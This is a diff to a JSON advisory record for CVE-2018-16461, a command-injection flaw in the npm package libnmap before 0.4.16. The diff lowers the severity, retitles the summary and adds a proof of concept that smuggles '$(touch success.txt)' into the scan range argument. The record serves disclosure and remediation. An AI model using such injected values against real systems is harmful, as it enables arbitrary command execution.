@@ -1,5 +1,5 @@
 {
-  "Severity": "HIGH",
+  "Severity": "MODERATE",
   "UpdatedAt": "2018-11-01T14:49:59Z",
   "Package": {
     "Ecosystem": "NPM",
@@ -27,12 +27,12 @@
         "Value": "CVE-2018-16461"
       }
     ],
-    "Description": "A command injection vulnerability in libnmap package for versions \u003c0.4.16 allows arbitrary commands to be executed via arguments to the range options.",
+    "Description": "Versions of `libnmap` before 0.4.16 are vulnerable to command injection. \n\nProof of concept\n\n```\nconst nmap = require('libnmap');\nconst opts = {\n    range: [\n        'scanme.nmap.org',\n        \"x.x.$(touch success.txt)\"\n    ]\n};\nnmap.scan(opts, function(err, report) {\n    if (err) throw new Error(err);\n\n    for (let item in report) {\n        console.log(JSON.stringify(report[item]));\n    }\n});\n```\n\n\n## Recommendation\n\nUpdate to version 0.4.16 or later",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-11-01T14:51:33Z",
-    "Severity": "HIGH",
-    "Summary": "High severity vulnerability that affects libnmap",
-    "UpdatedAt": "2019-07-03T21:02:05Z",
+    "Severity": "MODERATE",
+    "Summary": "Command Injection in libnmap",
+    "UpdatedAt": "2020-08-31T18:33:19Z",
     "WithdrawnAt": ""
   },
   "Versions": [
